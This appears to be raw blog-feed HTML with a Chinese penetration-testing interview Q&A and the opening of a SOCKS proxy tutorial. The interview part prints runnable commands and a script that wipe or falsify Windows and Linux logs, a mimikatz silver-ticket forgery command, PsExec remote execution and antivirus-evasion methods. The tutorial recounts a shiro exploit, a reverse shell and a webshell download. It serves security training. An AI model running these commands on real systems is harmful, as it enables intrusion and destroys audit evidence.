自动化的Web应用程序安全测试工具</li></ul></blockquote><h3 id="钓鱼邮件如何绕过安全设备的检测"><a href="#钓鱼邮件如何绕过安全设备的检测" class="headerlink" title="钓鱼邮件如何绕过安全设备的检测"></a>钓鱼邮件如何绕过安全设备的检测</h3><blockquote><p>去特征，从免杀的角度无非就是几种方法：花指令，杀软对抗，加壳免杀，编码免杀。发送邮件的邮件系统最好有 PTR 反向解析（可以减少邮件不被信任&#x2F;进垃圾箱的几率）。也可以使用 word 文档，excle 的宏等。</p></blockquote><h3 id="如果给你⼀个网站-你的渗透测试思路是什么-在获取书面授权的前提下。"><a href="#如果给你⼀个网站-你的渗透测试思路是什么-在获取书面授权的前提下。" class="headerlink" title="如果给你⼀个网站, 你的渗透测试思路是什么? 在获取书面授权的前提下。"></a>如果给你⼀个网站, 你的渗透测试思路是什么? 在获取书面授权的前提下。</h3><blockquote><p><a href="https://blog.csdn.net/qq_36119192/article/details/84674109">https://blog.csdn.net/qq_36119192/article/details/84674109</a></p></blockquote><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><ul><li>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等）。看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞。</li></ul><blockquote><p>对 IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。</p></blockquote><ul><li>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录</li><li>c、获取域名的whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等）</li></ul><blockquote><p>丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。</p></blockquote><ul><li>e、⼦域名收集，旁站，C 段等。因为主站⼀般⽐较难，所以先看看旁站有没有通⽤的 cms 或者其他漏洞。</li><li>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等。进⼀步探测⽹站的信息，后台，敏感⽂件等</li><li>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等</li><li>h、传输协议，通⽤漏洞，exp，github 源码等</li></ul></blockquote><h4 id="漏洞挖掘-x2F-扫描、验证与利用"><a href="#漏洞挖掘-x2F-扫描、验证与利用" class="headerlink" title="漏洞挖掘&#x2F;扫描、验证与利用"></a>漏洞挖掘&#x2F;扫描、验证与利用</h4><blockquote><p>有授权情况下可以根据情况进行漏洞扫描</p></blockquote><blockquote><ul><li>a、浏览⽹站，看看⽹站规模，功能，特点等</li><li>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql，ftp，ssh 弱⼝令等</li><li>c、XSS、SQL 注⼊、代码执行、命令执行、SSRF、CSRF、cookie 安全检测、敏感信息、暴⼒破解、任意⽂件上传、越权访问、未授权访问、⽬录遍历、⽂件 包含、重放攻击（短信轰炸）等服务器漏洞的检测</li><li>d、最后使⽤漏扫⼯具AWVS、xray、AppScan、Nessus等</li></ul></blockquote><blockquote><p>利用：通过漏洞拿下webshell或者是其他权限</p></blockquote><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><blockquote><p>获得了webshell后，一般权限很低，所以我们需要提权，可以选择<strong>反弹一个MSF类型的shell提权</strong>：Metasploit Framework(MSF)的使用  、 Msfvenonm生成一个后门木马，也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用， 也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权</p></blockquote><blockquote><p>a、mysql 提权 serv u 提权 oracle 提权 udf提权<br>b、windows 溢出提权、windows低版本的漏洞，如 iis6,pr, 巴⻄烤⾁<br>c、linux 脏⽜, 内核漏洞提权 </p></blockquote><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><blockquote><ol><li>内网信息收集</li><li>内网转发，搭建socks5代理</li><li>内网横向渗透</li><li>权限维持</li></ol></blockquote><h4 id="痕迹清除、清除测试数据-amp-输出报告"><a href="#痕迹清除、清除测试数据-amp-输出报告" class="headerlink" title="痕迹清除、清除测试数据 &amp; 输出报告"></a>痕迹清除、清除测试数据 &amp; 输出报告</h4><blockquote><p>最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p></blockquote><blockquote><p>⽇志、测试数据的清理 </p><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter: clearev</span><br></pre></td></tr></table></figure></blockquote><p>总结，输出渗透测试报告，附修复⽅案</p></blockquote><h4 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h4><blockquote><p>验证并发现是否有新漏洞，输出报告，归档</p></blockquote><h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><h4 id="⼊侵Windows后需要清除哪些⽇志？"><a href="#⼊侵Windows后需要清除哪些⽇志？" class="headerlink" title="⼊侵Windows后需要清除哪些⽇志？"></a>⼊侵Windows后需要清除哪些⽇志？</h4><ol><li>有远程桌面权限时手动删除日志：</li></ol><blockquote><ul><li>开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</li><li>wevtutil工具命令行清除：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    清理安全日志</span><br></pre></td></tr></table></figure><ul><li>清除recent：</li></ul><blockquote><p>或直接打开<code>C:\Users\Administrator\Recent</code>并删除所有内容<br>或在命令行中输入<code>del /f /s /q “%userprofile%\Recent*.*</code></p></blockquote></blockquote><ol start="2"><li>⼊侵 Linux 服务器后需要清除哪些⽇志？</li></ol><blockquote><p><a href="https://www.cnblogs.com/xiaozi/p/13648156.html">https://www.cnblogs.com/xiaozi/p/13648156.html</a></p></blockquote><blockquote><ul><li>清除命令历史记录</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">histroy -r          <span class="comment">#删除当前会话历史记录</span></span><br><span class="line"><span class="built_in">history</span> -c          <span class="comment">#删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">rm</span> .bash_history   <span class="comment">#删除历史文件中的内容</span></span><br><span class="line">HISTZISE=0          <span class="comment">#通过设置历史命令条数来清除所有历史记录</span></span><br></pre></td></tr></table></figure><ul><li>在隐蔽的位置执行命令，使用vim打开文件执行命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:set history=0</span><br><span class="line">:!command</span><br></pre></td></tr></table></figure><ul><li>完全删除日志文件</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br></pre></td></tr></table></figure><ul><li>针对性删除日志文件,如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除当天日志</span></span><br><span class="line">sed  -i <span class="string">&#x27;/当天日期/&#x27;</span>d  filename</span><br><span class="line"><span class="comment">#清楚执行IP的日志</span></span><br><span class="line">sed -i -e ‘/192.169.1.1/d’</span><br></pre></td></tr></table></figure><ul><li>篡改日志文件</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span></span><br><span class="line">sed  -i <span class="string">&#x27;/自己的ip/&#x27;</span>d  /var/log/messages</span><br><span class="line"><span class="comment"># 全局替换登录IP地址：</span></span><br><span class="line">sed -i <span class="string">&#x27;s/192.168.166.85/192.168.1.1/g&#x27;</span> secure</span><br></pre></td></tr></table></figure><ul><li>一键清除脚本：</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure></blockquote><h3 id="有什么⽐较曲折的渗透经历"><a href="#有什么⽐较曲折的渗透经历" class="headerlink" title="有什么⽐较曲折的渗透经历"></a>有什么⽐较曲折的渗透经历</h3><blockquote><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。</p><p><a href="http://www.hackdig.com/08/hack-106441.htm%E6%A1%88%E4%BE%8B">http://www.hackdig.com/08/hack-106441.htm案例</a></p></blockquote><h3 id="判断出⽹站的-CMS-对渗透有什么意义"><a href="#判断出⽹站的-CMS-对渗透有什么意义" class="headerlink" title="判断出⽹站的 CMS 对渗透有什么意义"></a>判断出⽹站的 CMS 对渗透有什么意义</h3><blockquote><p>查找⽹上已曝光的程序漏洞。如果开源，还能下载相对应的源码进⾏代码审计。</p></blockquote><h3 id="⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？-CMS，渗透时扫⽬录的意义？"><a href="#⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？-CMS，渗透时扫⽬录的意义？" class="headerlink" title="⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？   CMS，渗透时扫⽬录的意义？"></a>⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？   CMS，渗透时扫⽬录的意义？</h3><blockquote><p>敏感⽂件、⼆级⽬录扫描。站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="Linux提权的方式"><a href="#Linux提权的方式" class="headerlink" title="Linux提权的方式"></a>Linux提权的方式</h4><blockquote><ul><li>dirtypipe漏洞, suid提权, 脏牛提权，pkexec提权等</li><li>除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器当跳板, 达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术</li><li>Brief</li><li>枚举脚本</li><li>以 root 权限运⾏的程序</li><li>⽤户安装的软件</li><li>弱⼝令或者明⽂密码</li><li>只能内部访问的服务</li><li>suid 和 guid 错误配置</li><li>滥⽤ sudo 权限</li><li>以 root 权限运⾏的脚本⽂件</li><li>错误的路径配置</li><li>计划任务</li><li>未挂载的⽂件系统</li><li>NFS 共享</li><li>通过键盘记录仪窃取密码</li><li>其它有⽤的和提权相关的东⻄</li><li>内核提权</li></ul></blockquote><h4 id="windows提权方式"><a href="#windows提权方式" class="headerlink" title="windows提权方式"></a>windows提权方式</h4><blockquote><p>甜土豆（Juicy Potato（Sweet potato））</p><p>烂土豆（Rotten Potato）</p><p>热土豆 (HotPotato)</p><p>坏土豆（Pipepotato(BadPotato)）</p><p>最基本的就是 Exp 提权，数据库 SQLServer、MYSQL、UDF 等、第三⽅软件提权。</p><p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。</p></blockquote><h3 id="nmap的几种扫描方式"><a href="#nmap的几种扫描方式" class="headerlink" title="nmap的几种扫描方式"></a>nmap的几种扫描方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定端口和范围扫描：namp -p50-100 10.2.51.165</span><br><span class="line">全面扫描：nmap -A -T4 192.168.1.200</span><br><span class="line">子网扫描：namp 192.168.1.1/24</span><br><span class="line">扫描全部端口：nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br><span class="line">普通的半开扫描：nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">系统扫描：nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="信息外带"><a href="#信息外带" class="headerlink" title="信息外带"></a>信息外带</h3><blockquote><p><a href="https://www.cnblogs.com/sunny11/p/14399420.html#_label0">https://www.cnblogs.com/sunny11/p/14399420.html#_label0</a></p></blockquote><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><blockquote><ul><li>修改特征码：</li></ul><p>免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。</p><p>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><ul><li>花指令免杀</li></ul><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p><ul><li>加壳免杀</li></ul><p>说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p><p>当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。</p><ul><li>shellcode免杀</li></ul><p>将shellcode进行加密，动态解密恢复，申请可写可执行内存并写入解密后的shellcode，将函数指针指向这块内存的起始位置并开始执行</p></blockquote><h3 id="内网搭建代理的方式？"><a href="#内网搭建代理的方式？" class="headerlink" title="内网搭建代理的方式？"></a>内网搭建代理的方式？</h3><blockquote><p>我一般是使用<strong>EarthWorm、FRP、msf的socks代理模块、Stowaway搭建socks代理，使用proxychains使用我们搭建的代理对内网进行渗透</strong></p><p>msf搭建代理分三步走：msf添加路由、msf在指定端口开启socks5代理模块搭建socks代理、proxychains从指定端口使用socks5代理服务</p><p>端口转发用Lcx，但没用过，说自己忘记了</p></blockquote><h3 id="内网扫描的方式"><a href="#内网扫描的方式" class="headerlink" title="内网扫描的方式"></a>内网扫描的方式</h3><blockquote><p>内网fscan扫描 或者 搭建内网socks5代理然后走代理进行扫描</p><p>ladon：<a href="https://github.com/k8gege/Ladon/%E5%A4%A7%E5%9E%8B%E6%9A%B4%E5%8A%9B%E6%89%AB%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7">https://github.com/k8gege/Ladon/大型暴力扫内网工具</a></p></blockquote><h3 id="拿到一台域内的主机之后，怎么进行域渗透？"><a href="#拿到一台域内的主机之后，怎么进行域渗透？" class="headerlink" title="拿到一台域内的主机之后，怎么进行域渗透？"></a>拿到一台域内的主机之后，怎么进行域渗透？</h3><blockquote><p>收集域内信息，比如域控的 ip 地址，然后通过 mimikatz 抓取明文密码或者 hash，尝试进行 hash 传递攻击（可以使用 mimikatz 工具进行传递）。或者尝试一些域内的漏洞，比如 MS14-068，zerologin 等</p></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_40412037/article/details/113348310">内网渗透神器（Mimikatz）——使用教程</a></p></blockquote><h3 id="怎么查找域控"><a href="#怎么查找域控" class="headerlink" title="怎么查找域控"></a>怎么查找域控</h3><blockquote><ul><li>通过 DNS 查询</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig -t SRV _gc._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _ldap._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kerberos._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kpasswd._tcp.lab.ropnop.com</span><br></pre></td></tr></table></figure><ul><li>端⼝扫描</li></ul><blockquote><p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别</p></blockquote><ul><li>其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找</li><li>各种命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery </span><br><span class="line">net group &quot;Domain controllers&quot; </span><br><span class="line">nltest /DCLIST:pentest.com </span><br><span class="line">......</span><br></pre></td></tr></table></figure></blockquote><h3 id="制作白银票据"><a href="#制作白银票据" class="headerlink" title="制作白银票据"></a>制作白银票据</h3><blockquote><ul><li>条件：</li></ul><blockquote><ul><li>1.域名称</li><li>2.域的 SID 值</li><li>3.域的服务账户的密码 HASH</li><li>4.伪造的用户名，可以是任意用户名，一般伪造 administrator</li><li>5.需要访问的服务</li></ul></blockquote><ul><li>步骤：</li></ul><blockquote><p>第一步：管理员权限运行 mimikatz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug #提升权限</span><br><span class="line">sekurlsa::logonpasswords #获取 service 账户 hash 和 sid(同一个域下得 sid 一样)</span><br></pre></td></tr></table></figure><p>第二步：清空本地票据缓存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge #清理本地票据缓存</span><br><span class="line">kerberos::list #查看本地保存的票据</span><br></pre></td></tr></table></figure><p>第三步：伪造白银票据并导入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:superman.com /sid:S-1-5-21-259090122-541454442-2960687606 /target:win08.superman.com /rc4:f6f19db774c63e49e9af61346adff204 /service:cifs /user:administrator /ptt</span><br></pre></td></tr></table></figure><p>第四步：访问域控的共享目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir \win08\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程登陆，执行命令</span></span><br><span class="line">PsExec.exe \win08 cmd.exe</span><br><span class="line">whoami 查看权限</span><br></pre></td></tr></table></figure></blockquote></blockquote><h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3><blockquote><p>白银票据：抓取到了域控服务 hash 的情况下，在客户端以一个普通域用户的身份生成TGS 票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的 target机器中指定的服务。</p></blockquote><blockquote><p>黄金票据：直接抓取域控中账号的 hash，来在 client 端生成一个 TGT 票据，那么该票据是针对所有机器的所有服务。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x26 - Socks代理实战</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/0x26%20-%20Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>l  首先进行了信息收集，在扫目录的时候发现了一些敏感目录，访问其中一个目录的时候，登录发现了shiro组件及其漏洞（在burp挂了被动扫描，burp上安装了shiroscan组件，扫描到访问的网页的时候发现了shiro漏洞）</p><p>l  然后使用shiro漏洞利用工具，反弹shell到VPS，然后本地起一个临时的python的web服务器，在目标机器上wget下载冰蝎的一句话木马，拿下了VPS；也尝试了用shiro工具在网站种注入蚁剑的内存shell，用蚁剑连接，也拿到了shell</p><p>l  拿到目标机器后，ipconfig发现该web服务器下面还存在其他网段，用fscan扫他发现其他存活主机。开始搭建frp代理：自己VPS上搭建frp服务端frps，在拿到shell的服务器上上传frp工具及搭建frpc，连接服务端。搭建好socks5代理后，在自己VPS上上通过proxychains，使用nmap内网网段中的主机，发现21 和3306 端口开启，应该是ftp和mysql服务，尝试查找漏洞，利用海德拉爆破弱口令，拿到mysql</p><h1 id="Socks代理简介"><a href="#Socks代理简介" class="headerlink" title="Socks代理简介"></a>Socks代理简介</h1><h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>我们正常的HTTP通信是这样的：</p><blockquote><p>1.客户端先通过TCP与服务器建立一条连接&amp;#x20;</p><p>2.连接建立完成后，客户端向服务器发送请求（比如GET &#x2F;hello.html HTTP&#x2F;1.1，意为我想要取得服务器根目录&#x2F;下的hello.html文件）&amp;#x20;</p><p>3. 服务器接收到客户端发来的请求，找到所请求的文件，并通过原来的连接发回去。（接上条的例子，找到根目录&#x2F;下的hello.html文件，并发送HTTP&#x2F;1.1 200 OK，代表找到了这个文件，现在我就发送给你）&amp;#x20;</p><p>4. 客户端接收到服务器传过来的文件，并用浏览器渲染出来给用户看（通过html&#x2F;css以及js等把传回来的文本内容可视化，展示在屏幕上）</p></blockquote><p>而我们通过代理服务器A进行HTTP通信则是这样的：</p><blockquote><p>1.客户端先与A建立TCP连接，然后告诉代理服务器A我想要访问某某网址根目录下的hello.html&amp;#x20;</p><p>2. 代理服务器A收到客户端请求，再建立一条到服务端的TCP连接，把这个请求通过这个连接转发到服务端。&amp;#x20;</p><p>3. 这样在服务器看来，就好像是客户端请求了&#x2F;hello.html一样，然后把所请求的内容返回回去，代理服务器再把内容通过与客户端的连接送回客户端</p></blockquote><p>代理服务器A作为一个中间人，负责转发客户端请求消息以及服务端响应消息</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理（Forward Proxy）：是一个位于客户端和原始服务器（origin server）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的 IP 地址，还有代理程序的端口。</p><ul><li>隐藏访问者的行踪</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153405.png" alt="image-20220921015328233"></p><ul><li>访问无法访问的服务器B</li></ul><p>比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到能够访问谷歌的代理服务器，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153001.png" alt="image-20220921015342837"></p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理（Reverse Proxy）：正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间中的内容发送普通请求，接着反向代理将判断向何处（原始服务器）转交请求，并将获得的内容返回给客户端。实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p><ul><li>保护和隐藏原始资源服务器</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155093.png" alt="image-20220921015507026"></p><p>正向代理代理客户端，反向代理代理服务器。</p><h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的请求报文，并会传送真实IP。</p><p>透明代理实例，很多公司使用的行为管理软件</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155801.png" alt="image-20220921015554604"></p><p>客户端 A 和客户端 B 并不知道行为管理设备充当透明代理行为，当用户 A 或用户 B向服务器 A 或服务器 B 提交请求的时候，透明代理设备根据自身策略拦截并修改用户 A 或 B 的报文，并作为实际的请求方，向服务器 A 或 B 发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户 A 或 B，如上图，如果透明代理设置不允许访问服务器 B，那么用户 A 或者用户 B 就不会得到服务器 B 的数据。</p><blockquote><p>参考：<a href="https://laravelacademy.org/post/9336">https://laravelacademy.org/post/9336</a></p></blockquote><h2 id="什么是Socks"><a href="#什么是Socks" class="headerlink" title="什么是Socks"></a>什么是Socks</h2><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。</p><p>根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。</p><p>使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务。</p><p>注意是使用传输层TCP传输数据！！</p><blockquote><p>osi参考模型：<a href="https://www.cnblogs.com/qishui/p/5428938.html">https://www.cnblogs.com/qishui/p/5428938.html</a></p></blockquote><p>现今大多组织的网络架构，利用网络防火墙将组织内部的网络结构与外部网络如Internet 有效地隔离开来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET、FTP、SMTP等的接入。</p><p>而SOCKS则提供一个通用框架来使这些协议安全透明地穿过防火墙。</p><h2 id="什么是socks代理"><a href="#什么是socks代理" class="headerlink" title="什么是socks代理"></a>什么是socks代理</h2><p>1.被代理端与 代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；</p><p>2.SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有协议限制；</p><p>3. SOCKS4a：SOCKS 4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问</p><p>4. SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后客户端需要先发送请求来确认协议版本及认证方式</p><h2 id="我们为什么使用socks5代理"><a href="#我们为什么使用socks5代理" class="headerlink" title="我们为什么使用socks5代理"></a>我们为什么使用socks5代理</h2><blockquote><p><a href="https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12">https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12</a></p></blockquote><h2 id="使用Socks代理"><a href="#使用Socks代理" class="headerlink" title="使用Socks代理"></a>使用Socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCKS服务器的IP地址</span><br><span class="line">SOCKS服务所在端口</span><br><span class="line">SOCKS服务是否需要身份验证</span><br></pre></td></tr></table></figure><h2 id="Socks代理与VPN区别"><a href="#Socks代理与VPN区别" class="headerlink" title="Socks代理与VPN区别"></a>Socks代理与VPN区别</h2><p>VPN主要用于从外网访问企业、公司的内部网络，原理是先登录到VPN防火墙、服务器，得到权限，在进入内网。这个过程，用户一直是以自己的身份进行的。而Socks5是一种代理，也就是先所有的交互数据都先经过另一台主机（网卡），这个过程中用户访问其他网络是都是使用的代理服务提供者的身份。</p><ul><li>张三在外出差想访问公司内网服务器</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210157332.png" alt="image-20220921015752169"></p><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><h3 id="EarthWorm（用的少了，容易被杀，但很经典）"><a href="#EarthWorm（用的少了，容易被杀，但很经典）" class="headerlink" title="EarthWorm（用的少了，容易被杀，但很经典）"></a>EarthWorm（用的少了，容易被杀，但很经典）</h3><blockquote><p><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p></blockquote><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210158675.png" alt="image-20220921015814427"></p><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><blockquote><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p></blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用</p><h3 id="ProxyChains（linux代理软件、kali内置"><a href="#ProxyChains（linux代理软件、kali内置" class="headerlink" title="ProxyChains（linux代理软件、kali内置)"></a>ProxyChains（linux代理软件、kali内置)</h3><blockquote><p><a 